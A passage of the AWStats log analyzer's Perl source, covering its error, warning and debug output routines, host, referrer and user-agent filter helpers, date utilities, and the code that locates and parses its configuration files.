/>$tagfontgrey<i>\" : \"\" );\n\t\t\tprint \"$secondmessage\";\n\t\t\tprint(\n\t\t\t\tscalar keys %HTMLOutput\n\t\t\t\t? \"</i>$tagunfont${tagbr}${tagbr}\"\n\t\t\t\t: \"\"\n\t\t\t);\n\t\t\tprint \"\\n\";\n\t\t}\n\n#print \"Note: If your $NbOfLinesForCorruptedLog first lines in your log files are wrong because of \";\n#print \"a worm virus attack, you can increase the NbOfLinesForCorruptedLog parameter in config file.\\n\";\n#print \"\\n\";\n\t}\n\telse {\n\t\tprint( scalar keys %HTMLOutput ? \"<br />$tagfontred\\n\" : \"\" );\n\t\tprint( $ErrorMessages? \"$ErrorMessages\" : \"Error: $message\" );\n\t\tprint( scalar keys %HTMLOutput ? \"\\n</span><br />\" : \"\" );\n\t\tprint \"\\n\";\n\t}\n\tif ( !$ErrorMessages && !$donotshowsetupinfo ) {\n\t\tif ( $message =~ /Couldn.t open config file/i ) {\n\t\t\tmy $dir = $DIR;\n\t\t\tif ( $dir =~ /^\\./ ) { $dir .= '/../..'; }\n\t\t\telse { $dir =~ s/[\\\\\\/]?wwwroot[\\/\\\\]cgi-bin[\\\\\\/]?//; }\n\t\t\tprint \"${tagbr}\\n\";\n\t\t\tif ( $ENV{'GATEWAY_INTERFACE'} ) {\n\t\t\t\tprint\n\"- ${tagbold}Did you use the correct URL ?${tagunbold}${tagbr}\\n\";\n\t\t\t\tprint\n\"Example: http://localhost/awstats/awstats.pl?config=mysite${tagbr}\\n\";\n\t\t\t\tprint\n\"Example: http://127.0.0.1/cgi-bin/awstats.pl?config=mysite${tagbr}\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\"- ${tagbold}Did you use correct config parameter ?${tagunbold}${tagbr}\\n\";\n\t\t\t\tprint\n\"Example: If your config file is awstats.mysite.conf, use -config=mysite\\n\";\n\t\t\t}\n\t\t\tprint\n\"- ${tagbold}Did you create your config file 'awstats.$SiteConfig.conf' ?${tagunbold}${tagbr}\\n\";\n\t\t\tprint\n\"If not, you can run \\\"awstats_configure.pl\\\"\\nfrom command line, or create it manually.${tagbr}\\n\";\n\t\t\tprint \"${tagbr}\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint \"${tagbr}${tagbold}Setup (\"\n\t\t\t  . ( $FileConfig ? \"'\" . $FileConfig . \"'\" : \"Config\" )\n\t\t\t  . \" file, web server or permissions) may be wrong.${tagunbold}${tagbr}\\n\";\n\t\t}\n\t\tprint\n\"Check config file, permissions and AWStats documentation (in 'docs' directory).\\n\";\n\t}\n\n\t# Remove lock if not a lock message\n\tif ( $EnableLockForUpdate && $message !~ /lock file/ ) { &Lock_Update(0); }\n\tif ( scalar keys %HTMLOutput ) { print \"</body></html>\\n\"; }\n\texit 1;\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tWrite a warning message\n# Parameters:\t$message\n# Input:\t\t$HeaderHTTPSent $HeaderHTMLSent $WarningMessage %HTMLOutput\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub warning {\n\tmy $messagestring = shift;\n\n\tif ($Debug) { debug( \"$messagestring\", 1 ); }\n\tif ($WarningMessages) {\n\t\tif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }\n\t\tif ( !$HeaderHTMLSent )        { html_head(); }\n\t\tif ( scalar keys %HTMLOutput ) {\n\t\t\t$messagestring =~ s/\\n/\\<br\\>/g;\n\t\t\tprint \"$messagestring<br />\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint \"$messagestring\\n\";\n\t\t}\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write debug message and exit\n# Parameters:   $string $level\n# Input:        %HTMLOutput  $Debug=required level  $DEBUGFORCED=required level forced\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub debug {\n\tmy $level = $_[1] || 1;\n\n\tif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {\n\t\thttp_head();\n\t}    # To send the HTTP header and see debug\n\tif ( $level <= $DEBUGFORCED ) {\n\t\tmy $debugstring = $_[0];\n\t\tif ( !$DebugResetDone ) {\n\t\t\topen( DEBUGFORCEDFILE, \"<debug.log\" );\n\t\t\tclose DEBUGFORCEDFILE;\n\t\t\tchmod 0666, \"debug.log\";\n\t\t\t$DebugResetDone = 1;\n\t\t}\n\t\topen( DEBUGFORCEDFILE, \">>debug.log\" );\n\t\tprint DEBUGFORCEDFILE localtime(time)\n\t\t  . \" - $$ - DEBUG $level - $debugstring\\n\";\n\t\tclose DEBUGFORCEDFILE;\n\t}\n\tif ( $DebugMessages && $level <= $Debug ) {\n\t\tmy $debugstring = $_[0];\n\t\tif ( scalar keys %HTMLOutput ) {\n\t\t\t$debugstring =~ s/^ /&nbsp;&nbsp; /;\n\t\t\t$debugstring .= \"<br />\";\n\t\t}\n\t\tprint localtime(time) . \" - DEBUG $level - $debugstring\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Optimize an array of precompiled regex by removing duplicate entries\n# Parameters:\t@Array notcasesensitive=0|1\n# Input:        None\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub OptimizeArray {\n\tmy $array = shift;\n\tmy @arrayunreg = map { UnCompileRegex($_) } @$array;\n\tmy $notcasesensitive = shift;\n\tmy $searchlist       = 0;\n\tif ($Debug) {\n\t\tdebug( \"OptimizeArray (notcasesensitive=$notcasesensitive)\", 4 );\n\t}\n\twhile ( $searchlist > -1 && @arrayunreg ) {\n\t\tmy $elemtoremove = -1;\n\t  OPTIMIZELOOP:\n\t\tforeach my $i ( $searchlist .. ( scalar @arrayunreg ) - 1 ) {\n\n\t\t\t# Search if $i elem is already treated by another elem\n\t\t\tforeach my $j ( 0 .. ( scalar @arrayunreg ) - 1 ) {\n\t\t\t\tif ( $i == $j ) { next; }\n\t\t\t\tmy $parami =\n\t\t\t\t  $notcasesensitive ? lc( $arrayunreg[$i] ) : $arrayunreg[$i];\n\t\t\t\tmy $paramj =\n\t\t\t\t  $notcasesensitive ? lc( $arrayunreg[$j] ) : $arrayunreg[$j];\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug( \" Compare $i ($parami) to $j ($paramj)\", 4 );\n\t\t\t\t}\n\t\t\t\tif ( index( $parami, $paramj ) > -1 ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" Elem $i ($arrayunreg[$i]) already treated with elem $j ($arrayunreg[$j])\",\n\t\t\t\t\t\t\t4\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$elemtoremove = $i;\n\t\t\t\t\tlast OPTIMIZELOOP;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ( $elemtoremove > -1 ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\t\t\t\t\t\" Remove elem $elemtoremove - $arrayunreg[$elemtoremove]\",\n\t\t\t\t\t4 );\n\t\t\t}\n\t\t\tsplice @arrayunreg, $elemtoremove, 1;\n\t\t\t$searchlist = $elemtoremove;\n\t\t}\n\t\telse {\n\t\t\t$searchlist = -1;\n\t\t}\n\t}\n\tif ($notcasesensitive) {\n\t\treturn map { qr/$_/i } @arrayunreg;\n\t}\n\treturn map { qr/$_/ } @arrayunreg;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipDNSLookupFor array\n# Parameters:\tip @SkipDNSLookupFor (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipDNSLookup {\n\tforeach (@SkipDNSLookupFor) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipDNSLookupFor\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipHosts array\n# Parameters:\thost @SkipHosts (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipHost {\n\tforeach (@SkipHosts) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipHosts\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipReferrers array\n# Parameters:\thost @SkipReferrers (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipReferrer {\n\tforeach (@SkipReferrers) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipReferrers\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipUserAgents array\n# Parameters:\tuseragent @SkipUserAgents (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipUserAgent {\n\tforeach (@SkipUserAgents) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipUserAgent\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in SkipFiles array\n# Parameters:\turl @SkipFiles (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub SkipFile {\n\tforeach (@SkipFiles) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @SkipFiles\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyHosts array\n# Parameters:\thost @OnlyHosts (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyHost {\n\tforeach (@OnlyHosts) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyHosts\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyUsers array\n# Parameters:\thost @OnlyUsers (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyUser {\n\tforeach (@OnlyUsers) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyUsers\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyUserAgents array\n# Parameters:\tuseragent @OnlyUserAgents (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyUserAgent {\n\tforeach (@OnlyUserAgents) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyUserAgents\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in NotPageFiles array\n# Parameters:\turl @NotPageFiles (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub NotPageFile {\n\tforeach (@NotPageFiles) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @NotPageFiles\n}\n\n#------------------------------------------------------------------------------\n# Function:     Check if parameter is in OnlyFiles array\n# Parameters:\turl @OnlyFiles (a NOT case sensitive precompiled regex array)\n# Return:\t\t0 Not found, 1 Found\n#------------------------------------------------------------------------------\nsub OnlyFile {\n\tforeach (@OnlyFiles) {\n\t\tif ( $_[0] =~ /$_/ ) { return 1; }\n\t}\n\t0;    # Not in @OnlyFiles\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return day of week of a day\n# Parameters:\t$day $month $year\n# Return:\t\t0-6\n#------------------------------------------------------------------------------\nsub DayOfWeek {\n\tmy ( $day, $month, $year ) = @_;\n\tif ($Debug) { debug( \"DayOfWeek for $day $month $year\", 4 ); }\n\tif ( $month < 3 ) { $month += 10; $year--; }\n\telse { $month -= 2; }\n\tmy $cent = sprintf( \"%1i\", ( $year / 100 ) );\n\tmy $y    = ( $year % 100 );\n\tmy $dw   = (\n\t\tsprintf( \"%1i\", ( 2.6 * $month ) - 0.2 ) + $day + $y +\n\t\t  sprintf( \"%1i\", ( $y / 4 ) ) + sprintf( \"%1i\", ( $cent / 4 ) ) -\n\t\t  ( 2 * $cent ) ) % 7;\n\t$dw += 7 if ( $dw < 0 );\n\tif ($Debug) { debug( \" is $dw\", 4 ); }\n\treturn $dw;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return 1 if a date exists\n# Parameters:\t$day $month $year\n# Return:\t\t1 if date exists else 0\n#------------------------------------------------------------------------------\nsub DateIsValid {\n\tmy ( $day, $month, $year ) = @_;\n\tif ($Debug) { debug( \"DateIsValid for $day $month $year\", 4 ); }\n\tif ( $day < 1 )  { return 0; }\n\tif ( $day > 31 ) { return 0; }\n\tif ( $month == 4 || $month == 6 || $month == 9 || $month == 11 ) {\n\t\tif ( $day > 30 ) { return 0; }\n\t}\n\telsif ( $month == 2 ) {\n\t\tmy $leapyear = ( $year % 4 == 0 ? 1 : 0 );   # A leap year every 4 years\n\t\tif ( $year % 100 == 0 && $year % 400 != 0 ) {\n\t\t\t$leapyear = 0;\n\t\t}    # Except if year is 100x and not 400x\n\t\tif ( $day > ( 28 + $leapyear ) ) { return 0; }\n\t}\n\treturn 1;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return string of visit duration\n# Parameters:\t$starttime $endtime\n# Input:        None\n# Output:\t\tNone\n# Return:\t\tA string from $SessionsRange[0..6] that identify the visit duration range\n#------------------------------------------------------------------------------\nsub GetSessionRange {\n\tmy $param1=shift;\n\tmy $param2=shift;\n\n\t# skip unneeded calculations if its the same\n\tif ($param1 == $param2) { return $SessionsRange[0]; }\n\n\tmy $starttime;\n\tmy $endtime;\n\n\teval {\n\t\t#safety to prevent Time::Local causing termination on invalid data\n\t\t#Ex: Second '84' out of range 0..59 at /xxx/awstats.pl\n\t\tif ($param1 =~ /$regdate/o) { $starttime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }\n\t\tif ($param2 =~ /$regdate/o) { $endtime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }\n\t};\n\t\n\tmy $delay = $endtime - $starttime;\n\tif ($Debug) {\n\t\tdebug( \"GetSessionRange $endtime - $starttime = $delay\", 4 );\n\t}\n\tif ( $delay <= 30 )   { return $SessionsRange[0]; }\n\tif ( $delay <= 120 )  { return $SessionsRange[1]; }\n\tif ( $delay <= 300 )  { return $SessionsRange[2]; }\n\tif ( $delay <= 900 )  { return $SessionsRange[3]; }\n\tif ( $delay <= 1800 ) { return $SessionsRange[4]; }\n\tif ( $delay <= 3600 ) { return $SessionsRange[5]; }\n\treturn $SessionsRange[6];\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return string with just the extension of a file in the URL\n# Parameters:\t$regext, $url without query string\n# Input:        None\n# Output:\t\tNone\n# Return:\t\tA lowercase string with the name of the extension, e.g. \"html\"\n#------------------------------------------------------------------------------\nsub Get_Extension{\n\tmy $extension;\n\tmy $regext = shift;\n\tmy $urlwithnoquery = shift;\n\tif ( $urlwithnoquery =~ /$regext/o\n\t\t|| ( $urlwithnoquery =~ /[\\\\\\/]$/ && $DefaultFile[0] =~ /$regext/o )\n\t  )\n\t{\n\t\t$extension =\n\t\t  ( $LevelForFileTypesDetection >= 2 || $MimeHashLib{$1} )\n\t\t  ? lc($1)\n\t\t  : 'Unknown';\n\t}\n\telse {\n\t\t$extension = 'Unknown';\n\t}\t\n\treturn $extension;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Returns just the file of the url\n# Parameters:\t-\n# Input:        $url\n# Output:\t\tString with the file name\n# Return:\t\t-\n#------------------------------------------------------------------------------\nsub Get_Filename{\n\tmy $temp = shift;\n\tmy $idx = -1;\n\t# check for slash\n\t$idx = rindex($temp, \"/\");\n\tif ($idx > -1){ $temp = substr($temp, $idx+1);}\n\telse{ \n\t\t$idx = rindex($temp, \"\\\\\");\n\t\tif ($idx > -1){ $temp = substr($temp, $idx+1);}\n\t}\n\treturn $temp;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Compare two browsers version\n# Parameters:\t$a\n# Input:        None\n# Output:\t\tNone\n# Return:\t\t-1, 0, 1\n#------------------------------------------------------------------------------\nsub SortBrowsers {\n\tmy $a_family = $a;\n\tmy @a_ver    = ();\n\tforeach my $family ( keys %BrowsersFamily ) {\n\t\tif ( $a =~ /^$family/i ) {\n\t\t\t$a =~ m/^(\\D+)([\\d\\.]+)?$/;\n\t\t\t$a_family = $1;\n\t\t\t@a_ver = split( /\\./, $2 );\n\t\t}\n\t}\n\tmy $b_family = $b;\n\tmy @b_ver    = ();\n\tforeach my $family ( keys %BrowsersFamily ) {\n\t\tif ( $b =~ /^$family/i ) {\n\t\t\t$b =~ m/^(\\D+)([\\d\\.]+)?$/;\n\t\t\t$b_family = $1;\n\t\t\t@b_ver = split( /\\./, $2 );\n\t\t}\n\t}\n\n\tmy $compare = 0;\n\tmy $done    = 0;\n\n\t$compare = $a_family cmp $b_family;\n\tif ( $compare != 0 ) {\n\t\treturn $compare;\n\t}\n\n\twhile ( !$done ) {\n\t\tmy $a_num = shift @a_ver || 0;\n\t\tmy $b_num = shift @b_ver || 0;\n\n\t\t$compare = $a_num <=> $b_num;\n\t\tif ( $compare != 0\n\t\t\t|| ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ) )\n\t\t{\n\t\t\t$done = 1;\n\t\t}\n\t}\n\n\treturn $compare;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Read config file\n# Parameters:\tNone or configdir to scan\n# Input:        $DIR $PROG $SiteConfig\n# Output:\t\tGlobal variables\n# Return:\t\t-\n#------------------------------------------------------------------------------\nsub Read_Config {\n\n\t# Check config file in common possible directories :\n\t# Windows :                   \t\t\t\t\"$DIR\" (same dir than awstats.pl)\n\t# Standard, Mandrake and Debian package :\t\"/etc/awstats\"\n\t# Other possible directories :\t\t\t\t\"/usr/local/etc/awstats\", \"/etc\"\n\t# FHS standard, Suse package : \t\t\t\t\"/etc/opt/awstats\"\n\tmy $configdir         = shift;\n\tmy @PossibleConfigDir = (\n\t\t\t\"$DIR\",\n\t\t\t\"/etc/awstats\",\n\t\t\t\"/usr/local/etc/awstats\", \"/etc\",\n\t\t\t\"/etc/opt/awstats\"\n\t\t); \n\n\tif ($configdir) {\n\t\t# Check if configdir is outside default values.\n\t\tmy $outsidedefaultvalue=1;\n\t\tforeach (@PossibleConfigDir) {\n\t\t\tif ($_ eq $configdir) { $outsidedefaultvalue=0; last; }\n\t\t}\n\n\t\t# If from CGI, overwriting of configdir with a value that differs from a default value\n\t\t# is only possible if AWSTATS_ENABLE_CONFIG_DIR defined.\n\t\t# AWSTATS_ENABLE_CONFIG_DIR must contains dir allowed\n\t\tif ($ENV{'GATEWAY_INTERFACE'} && $outsidedefaultvalue)\n\t\t{\n\t\t\tif (! $ENV{\"AWSTATS_ENABLE_CONFIG_DIR\"})\n\t\t\t{\n\t\t\t\terror(\"Sorry, to allow overwriting of configdir parameter, from an AWStats CGI page, with a non default value, environment variable AWSTATS_ENABLE_CONFIG_DIR must be set to full path of allowed directory. For example, by adding the line 'SetEnv AWSTATS_ENABLE_CONFIG_DIR /mydirofconf' in your Apache config file or into a .htaccess file.\");\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif ($configdir !~ $ENV{\"AWSTATS_ENABLE_CONFIG_DIR\"})\n\t\t\t\t{\n\t\t\t\t\terror(\"Sorry, using configdir parameter from an AWStats CGI page is possible only if parameter configdir is a directory defined into environment variable AWSTATS_ENABLE_CONFIG_DIR\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t@PossibleConfigDir = (\"$configdir\");\n\t}\n\n\t# Open config file\n\t$FileConfig = $FileSuffix = '';\n\tforeach (@PossibleConfigDir) {\n\t\tmy $searchdir = $_;\n\t\tif ( $searchdir && $searchdir !~ /[\\\\\\/]$/ ) { $searchdir .= \"/\"; }\n\t\t\n\t\tif ( -f $searchdir.$PROG.\".\".$SiteConfig.\".conf\" &&  open( CONFIG, \"<$searchdir$PROG.$SiteConfig.conf\" ) ) {\n\t\t\t$FileConfig = \"$searchdir$PROG.$SiteConfig.conf\";\n\t\t\t$FileSuffix = \".$SiteConfig\";\n\t\t\tif ($Debug){debug(\"Opened config: $searchdir$PROG.$SiteConfig.conf\", 2);}\n\t\t\tlast;\n\t\t}else{if ($Debug){debug(\"Unable to open config file: $searchdir$PROG.$SiteConfig.conf\", 2);}}\n\t\t\n\t\tif ( -f $searchdir.$PROG.\".conf\" &&  open( CONFIG, \"$searchdir$PROG.conf\" ) ) {\n\t\t\t$FileConfig = \"$searchdir$PROG.conf\";\n\t\t\t$FileSuffix = '';\n\t\t\tif ($Debug){debug(\"Opened config: $searchdir$PROG.conf\", 2);}\n\t\t\tlast;\n\t\t}else{if ($Debug){debug(\"Unable to open config file: $searchdir$PROG.conf\", 2);}}\n\t\t\n\t\t# Added to open config if file name is passed to awstats \n\t\tif ( -f $searchdir.$SiteConfig && open( CONFIG, \"$searchdir$SiteConfig\" ) ) {\n\t\t\t$FileConfig = \"$searchdir$SiteConfig\";\n\t\t\t$FileSuffix = '';\n\t\t\tif ($Debug){debug(\"Opened config: $searchdir$SiteConfig\", 2);}\n\t\t\tlast;\n\t\t}else{if ($Debug){debug(\"Unable to open config file: $searchdir$SiteConfig\", 2);}}\n\t}\n\t\n\t#CL - Added to open config if full path is passed to awstats \n\tif ( !$FileConfig ) {\n\t\t\n\t\tmy $SiteConfigBis = File::Spec->rel2abs($SiteConfig);\n\t\tdebug(\"Finally, try to open an absolute path : $SiteConfigBis\", 2);\n\t\n\t\tif ( -f $SiteConfigBis && open(CONFIG, \"$SiteConfigBis\")) {\n\t\t\t$FileConfig = \"$SiteConfigBis\";\n\t\t\t$FileSuffix = '';\n\t\t\tif ($Debug){debug(\"Opened config: $SiteConfigBis\", 2);}\n\t\t\t$SiteConfig=$SiteConfigBis;\n\t\t}\n\t\telse {\n\t\t\tif ($Debug){debug(\"Unable to open config file: $SiteConfigBis\", 2);}\n\t\t}\n\t}\n\t\n\tif ( !$FileConfig ) {\n\t\tif ($DEBUGFORCED || !$ENV{'GATEWAY_INTERFACE'}){\n\t\terror(\n\"Couldn't open config file \\\"$PROG.$SiteConfig.conf\\\", nor \\\"$PROG.conf\\\", nor \\\"$SiteConfig\\\" after searching in path \\\"\"\n\t\t\t  . join( ', ', @PossibleConfigDir )\n\t\t\t  . \", $SiteConfig\\\": $!\" );\n\t\t}else{error(\"Couldn't open config file \\\"$PROG.$SiteConfig.conf\\\" nor \\\"$PROG.conf\\\". \n\t\tPlease read the documentation for directories where the configuration file should be located.\"); }\n\t}\n\n\t# Analyze config file content and close it\n\t&Parse_Config( *CONFIG, 1, $FileConfig );\n\tclose CONFIG;\n\n\t# If parameter NotPageList not found, init for backward compatibility\n\tif ( !$FoundNotPageList ) {\n\t\t%NotPageList = (\n\t\t\t'css'   => 1,\n\t\t\t'js'    => 1,\n\t\t\t'class' => 1,\n\t\t\t'gif'   => 1,\n\t\t\t'jpg'   => 1,\n\t\t\t'jpeg'  => 1,\n\t\t\t'png'   => 1,\n\t\t\t'bmp'   => 1,\n\t\t\t'ico'   => 1,\n\t\t\t'swf'   => 1\n\t\t);\n\t}\n\n\t# If parameter ValidHTTPCodes empty, init for backward compatibility\n\tif ( !scalar keys %ValidHTTPCodes ) {\n\t\t$ValidHTTPCodes{\"200\"} = $ValidHTTPCodes{\"304\"} = 1;\n\t}\n\n\t# If parameter ValidSMTPCodes empty, init for backward compatibility\n\tif ( !scalar keys %ValidSMTPCodes ) {\n\t\t$ValidSMTPCodes{\"1\"} = $ValidSMTPCodes{\"250\"} = 1;\n\t}\n\n\t# If parameter TrapInfosForHTTPErrorCodes empty, init to default\n\tif ( !scalar keys %TrapInfosForHTTPErrorCodes ) {\n\t\t$TrapInfosForHTTPErrorCodes{\"404\"} = 1;\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Parse content of a config file\n# Parameters:\topened file handle, depth level, file name\n# Input:        -\n# Output:\t\tGlobal variables\n# Return:\t\t-\n#------------------------------------------------------------------------------\nsub Parse_Config {\n\tmy ($confighandle) = $_[0];\n\tmy $level          = $_[1];\n\tmy $configFile     = $_[2];\n\tmy $versionnum     = 0;\n\tmy $conflinenb     = 0;\n\n\tif ( $level > 10 ) {\n\t\terror(\n\"$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop).\"\n\t\t);\n\t}\n\n\twhile (<$confighandle>) {\n\t\tchomp $_;\n\t\ts/\\r//;\n\t\t$conflinenb++;\n\n\t\t# Extract version from first line\n\t\tif ( !$versionnum && $_ =~ /^# AWSTATS CONFIGURE FILE (\\d+).(\\d+)/i ) {\n\t\t\t$versionnum = ( $1 * 1000 ) + $2;\n\n\t\t\t#if ($Debug) { debug(\" Configure file version is $versionnum\",1); }\n\t\t\tnext;\n\t\t}\n\n\t\tif ( $_ =~ /^\\s*$/ ) { next; }\n\n\t\t# Check includes\n\t\tif ( $_ =~ /^Include \"([^\\\"]+)\"/ || $_ =~ /^#include \"([^\\\"]+)\"/ )\n\t\t{    # #include kept for backward compatibility\n\t\t\tmy $includeFile = $1;\n\n\t\t\t# Expand __var__ by values\n\t\t\twhile ( $includeFile =~ /__([^\\s_]+(?:_[^\\s_]+)*)__/ ) {\n\t\t\t\tmy $var = $1;\n\t\t\t\t$includeFile =~ s/__${var}__/$ENV{$var}/g;\n\t\t\t}\n\t\t\tif ($Debug) { debug( \"Found an include : $includeFile\", 2 ); }\n\t\t\tif ( $includeFile !~ /^([a-zA-Z]:)?[\\\\\\/]/ ) {\n\t\t\t\t# Correct relative include files\n\t\t\t\tif ( $FileConfig =~ /^(.*[\\\\\\/])[^\\\\\\/]*$/ ) {\n\t\t\t\t\t$includeFile = \"$1$includeFile\";\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( $level > 1 ) {\n\t\t\t\twarning(\n\"Warning: Perl versions before 5.6 cannot handle nested includes\"\n\t\t\t\t);\n\t\t\t\tnext;\n\t\t\t}\n            local( *CONFIG_INCLUDE );   # To avoid having parent file closed when include file is closed\n\t\t\tif ( open( CONFIG_INCLUDE, \"<$includeFile\" ) ) {\n\t\t\t\t&Parse_Config( *CONFIG_INCLUDE, $level + 1, $includeFile );\n\t\t\t\tclose(CONFIG_INCLUDE);\n\t\t\t}\n\t\t\telse {\n\t\t\t\terror(\"Could not open include file: $includeFile\");\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n\t\t# Remove comments\n\t\tif ( $_ =~ /^\\s*#/ ) { next; }\n\t\t$_ =~ s/\\s#.*$//;\n\n\t\t# Extract param and value\n\t\tmy ( $param, $value ) = split( /=/, $_, 2 );\n\t\t$param =~ s/^\\s+//;\n\t\t$param =~ s/\\s+$//;\n\n\t\t# If not a param=value, try with next line\n\t\tif ( !$param ) {\n\t\t\twarning(\n\"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored.\"\n\t\t\t);\n\t\t\tnext;\n\t\t}\n\t\tif ( !defined $value ) {\n\t\t\twarning(\n\"Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored.\"\n\t\t\t);\n\t\t\tnext;\n\t\t}\n\n\t\tif ($value) {\n\t\t\t$value =~ s/^\\s+//;\n\t\t\t$value =~ s/\\s+$//;\n\t\t\t$value =~ s/^\\\"//;\n\t\t\t$value =~ s/\\\";?$//;\n\n\t\t\t# Replace __MONENV__ with value of environnement variable MONENV\n\t\t\t# Must be able to replace __VAR_1____VAR_2__\n\t\t\twhile ( $value =~ /__([^\\s_]+(?:_[^\\s_]+)*)__/ ) {\n\t\t\t\tmy $var = $1;\n\t\t\t\t$value =~ s/__${var}__/$ENV{$var}/g;\n\t\t\t}\n\t\t}\n\n\t\t# Initialize parameter for (param,value)\n\t\tif ( $param =~ /^LogFile/ ) {\n\t\t\tif ( $QueryString !~ /logfile=([^\\s&]+)/i ) { $LogFile = $value; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^DirIcons/ ) {\n\t\t\tif ( $QueryString !~ /diricons=([^\\s&]+)/i ) { $DirIcons = $value; }\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^SiteDomain/ ) {\n\n\t\t\t# No regex test as SiteDomain is always exact value\n\t\t\t$SiteDomain = $value;\n\n  \t\t\tif ($SiteDomain =~ m/xn--/) \n  \t\t\t{\n\t\t\t\t# TODO Add code to test if IDNA::Punycode module is on\n\t\t\t\t#use IDNA::Punycode;\n\t\t\t\t$DecodePunycode=0;\t# Set to 1 if module is on\t\n  \t\t\t\tif ($DecodePunycode)\n  \t\t\t\t{\n\t                idn_prefix(undef);\n\t                my @parts = split(/\\./, $SiteDomain);\n\t                foreach (@parts) {\n\t                \tif ($_ =~ s/^xn--//) {\n\t                    \teval { $_ = decode_punycode($_); };\n\t                        if (my $e = $@) { $_ = $e; }\n\t                    }\n\t                }\n\t                $SiteDomain = join('.', @parts);\n  \t\t\t\t}\n            }\n                        \t\t\t\n\t\t\tnext;\n\t\t}\n\t\tif ( $param =~ /^AddLinkToExternalCGIWrapper/ ) {\n\n\t\t\t# No regex test as AddLinkToExternalCGIWrapper is always exact value\n\t\t\t$AddLinkToExternalCGIWrapper = $value;\n\t\t\tnext;\n        }\n\t\tif ( $param =~ /^HostAliases/ ) {\n\t\t\t@HostAliases = ();\n\t\t\tforeach my $elem ( split( /\\s+/, $value ) ) {\n\t\t\t\tif ( $elem =~ s/^\\@// ) {    # If list of hostaliases in a file\n\t\t\t\t\topen( DATAFILE, \"<$elem\" )\n\t\t\t\t\t  || error(\n\"Failed to open file '$elem' declared in HostAliases parameter\"\n\t\t\t\t\t  );\n\t\t\t\t\tmy @val = map( 